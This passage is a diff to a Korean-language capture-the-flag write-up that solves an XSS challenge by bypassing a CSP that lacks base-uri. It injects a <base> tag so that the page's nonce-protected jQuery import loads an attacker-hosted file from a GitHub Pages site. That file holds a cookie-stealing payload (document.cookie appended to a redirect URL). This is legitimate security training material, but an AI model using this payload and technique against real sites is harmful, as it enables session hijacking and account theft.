@@ -128,3 +128,35 @@ app.run(host="0.0.0.0", port=8000)
 ```
 
 마침 `base-uri` 가 설정되어 있지 않기 때문에 `<base>` 태그를 삽입하여 공격할 수 있다고 생각했다.
+
+### 풀이
+
+- 기본 틀인 base.html에서 다음과 같은 코드가 있다
+
+```html
+		{% raw %}
+		<script src="{{ url_for('static', filename='js/jquery.min.js')}}" nonce={{ nonce }}></script>
+    <script src="{{ url_for('static', filename='js/bootstrap.min.js') }}" nonce={{ nonce }}></script>
+    {% endraw %}
+```
+
+- base-uri를 통해 공격 서버를 만들고 해당 서버에서 다음과 같은 코드를 보냄
+
+```html
+location.href="http://127.0.0.1:8000/memo?memo="+ document.cookie
+```
+
+- 위의 코드를 받은 스크립트 문이 vuln API에서 렌더링되기 때문에 공격 성공
+
+1. 개인 서버가 없기 때문에 github 블로그를 통해 JS 코드를 전달할 것이다.
+2. gitblog에 static/js 폴더를 만들고 jquery.min.js 파일을 아래와 같이 만들었다
+
+```html
+location.href="http://127.0.0.1:8000/memo?memo="+ document.cookie
+```
+
+1. `<base>` 태그를 통해 해당 코드에 접근하게 했다
+
+```html
+<base href="https://yunseo10987.github.io/">
+```
